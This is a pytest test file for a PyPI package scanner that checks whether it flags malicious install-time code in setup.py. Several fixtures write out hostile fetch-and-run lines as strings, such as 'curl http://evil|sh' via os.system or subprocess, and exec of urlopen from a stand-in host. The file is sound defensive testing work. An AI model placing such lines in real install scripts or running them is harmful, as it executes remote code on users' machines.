# SPDX-License-Identifier: AGPL-3.0-or-later
from pathlib import Path

from pkgsentry.ecosystems.pypi.installer import analyze_install_scripts


def _write(p: Path, content: str) -> None:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content, encoding="utf-8")


def test_clean_setup_py(tmp_path):
    _write(tmp_path / "setup.py", "from setuptools import setup\nsetup(name='x', version='1')\n")
    findings = analyze_install_scripts(tmp_path)
    assert findings == []


def test_urlopen_exec_chain_critical(tmp_path):
    _write(tmp_path / "setup.py", (
        "from setuptools import setup\n"
        "import urllib.request\n"
        "exec(urllib.request.urlopen('https://evil/x').read())\n"
        "setup(name='x', version='1')\n"
    ))
    findings = analyze_install_scripts(tmp_path)
    assert any(f.rule_id == "installer.urlopen_exec_chain" and f.severity == "critical" for f in findings)


def test_subprocess_at_import_time(tmp_path):
    _write(tmp_path / "setup.py", (
        "import subprocess\n"
        "subprocess.Popen(['sh','-c','curl http://evil|sh'])\n"
        "from setuptools import setup\nsetup(name='x', version='1')\n"
    ))
    findings = analyze_install_scripts(tmp_path)
    ids = {f.rule_id for f in findings}
    assert "installer.subprocess_at_install" in ids


def test_os_system_at_import_time(tmp_path):
    _write(tmp_path / "setup.py", "import os\nos.system('curl http://evil|sh')\n")
    findings = analyze_install_scripts(tmp_path)
    assert any(f.rule_id == "installer.os_system_at_install" for f in findings)


def test_pyproject_with_build_hook(tmp_path):
    _write(tmp_path / "pyproject.toml",
           '[build-system]\nrequires = ["setuptools"]\nbuild-backend = "setuptools.build_meta"\n')
    _write(tmp_path / "setup.cfg", "[metadata]\nname = x\n")
    findings = analyze_install_scripts(tmp_path)
    assert findings == []


def test_nested_setup_py_is_ignored(tmp_path):
    """A file named setup.py deep inside a package tree is a normal helper
    module, NOT an install-time entry point. Don't false-positive on its
    contents (e.g. an alpi_agent/alpi/alp/setup.py with subprocess inside)."""
    _write(
        tmp_path / "alpi_agent-0.6.2" / "alpi" / "alp" / "setup.py",
        "import subprocess\nsubprocess.Popen(['clip'])\n",
    )
    # No top-level setup.py at depth 1 or 2 — the real installer would be at
    # alpi_agent-0.6.2/setup.py if it existed.
    findings = analyze_install_scripts(tmp_path)
    assert findings == []


def test_real_setup_py_at_sdist_depth_2(tmp_path):
    """Standard sdist layout: extracted_root/<name-version>/setup.py."""
    _write(
        tmp_path / "pkg-1.0" / "setup.py",
        "import subprocess\nsubprocess.Popen(['curl', 'evil'])\n",
    )
    findings = analyze_install_scripts(tmp_path)
    assert any(f.rule_id == "installer.subprocess_at_install" for f in findings)
